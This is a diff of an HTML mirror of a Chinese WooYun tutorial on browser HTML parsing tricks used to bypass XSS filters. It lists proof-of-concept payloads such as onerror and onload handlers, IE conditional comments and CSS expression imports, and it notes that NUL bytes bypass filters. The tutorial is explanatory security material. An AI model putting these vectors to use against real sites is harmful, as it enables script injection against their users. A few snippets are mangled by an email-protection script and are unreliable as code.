@@ -3,12 +3,12 @@
 			<head>
 			     <title>Browser Security-超文本标记语言（HTML） - 瞌睡龙</title>
 				 <meta http-equiv="content-type" content="text/html; charset=UTF-8">
-			</head>
+			<link rel="stylesheet" type="text/css" href="../stylesheets/stylesheet.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/github-dark.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/print.css" media="print"><style type="text/css">body {width: 90%;max-width: 960px;display: block;margin: 0 auto;}img {max-width: 900px;}</style></head>
 			<body>
 				<h1>原文地址:<a href="http://drops.wooyun.org/tips/147">http://drops.wooyun.org/tips/147</a></h1>
 				
       <p>
-        <h4>重要的4个规则：</h4>
+        </p><h4>重要的4个规则：</h4>
 
 <pre><code>1 &amp;符号不应该出现在HTML的大部分节点中。
 2 尖括号&lt;&gt;是不应该出现在标签内的，除非为引号引用。
@@ -28,7 +28,7 @@
 
 <h4>了解HTML解析</h4>
 
-<p><a href="http://static.wooyun.org/20141017/2014101716205670084.jpeg"><img src="http://static.wooyun.org/20140918/2014091812393789842.jpeg" alt="" title="html" width="300" height="55" class="alignnone size-medium wp-image-148" /></a></p>
+<p><a href="http://static.wooyun.org/20141017/2014101716205670084.jpeg"><img src="http://static.wooyun.org/20140918/2014091812393789842.jpeg" alt="" title="html" width="300" height="55" class="alignnone size-medium wp-image-148"></a></p>
 
 <p>在IE浏览器中允许在1中插入NUL字符(0x00)，可以绕过非常多的xss过滤器。</p>
 
@@ -455,7 +455,7 @@ alert(2)// JavaScript
 &lt;![endif] &gt; 
 </code></pre>
 
-<p>同时IE还支持另外一种方法来执行条件语句，就是通过<comment>标签，并且标签之间的代码并不会执行，但是其他浏览器却会执行。</p>
+<p>同时IE还支持另外一种方法来执行条件语句，就是通过<comment>标签，并且标签之间的代码并不会执行，但是其他浏览器却会执行。</comment></p>
 
 <pre><code>&lt;comment&gt;&lt;img src=x onerror=alert(3)&gt;&lt;comment&gt;
 &lt;comment onclick=alert(1)&gt;XXX--&gt; //Opera不执行
@@ -464,8 +464,8 @@ alert(2)// JavaScript
 <p>IE的JS引擎里同样也有条件注释的语法：</p>
 
 <pre><code>&lt;script&gt;
-<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="755a5a351616">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>_on!alert(1)
-<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="c0efea80a3a3">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>_on~alert(2)@*/
+<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="755a5a351616">[email&#160;protected]</a><script data-cfhash="f9e31" type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>_on!alert(1)
+<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="c0efea80a3a3">[email&#160;protected]</a><script data-cfhash="f9e31" type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>_on~alert(2)@*/
 &lt;/script&gt;
 </code></pre>
 
@@ -544,7 +544,7 @@ c s cri &amp;#x00D; pt %
 data:%,&lt;b&gt; &lt; s &amp;#10 c r i p t&gt;alert(1) &lt; /s &amp;#10 c r i p t&gt;
 </code></pre>
 
-<p>之前提到的标签，在IE中data:协议都不能执行javascript，但是在style标签里，<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="af4a20004b140a462f35471028efc6c2dfc0dddb4a3e124b140b49203d4a2a0acbcedbce">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>:执行javascript：</p>
+<p>之前提到的标签，在IE中data:协议都不能执行javascript，但是在style标签里，<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="af4a20004b140a462f35471028efc6c2dfc0dddb4a3e124b140b49203d4a2a0acbcedbce">[email&#160;protected]</a><script data-cfhash="f9e31" type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>:执行javascript：</p>
 
 <pre><code>&lt;style&gt;
 @import "data:,*%7bx:expression(write(1))%7D";
@@ -781,7 +781,7 @@ c='&amp;apos;,alert(3)//';
 &lt;g onload="alert(1)"&gt;&lt;/g&gt;
 &lt;/svg&gt;
 &lt;svg xmlns="http://www.w3.org/2000/svg" onload="alert(2)"&gt;&lt;/svg&gt;
-</code></pre>      </p>
+</code></pre>      <p></p>
     
 			</body>
 		</html>
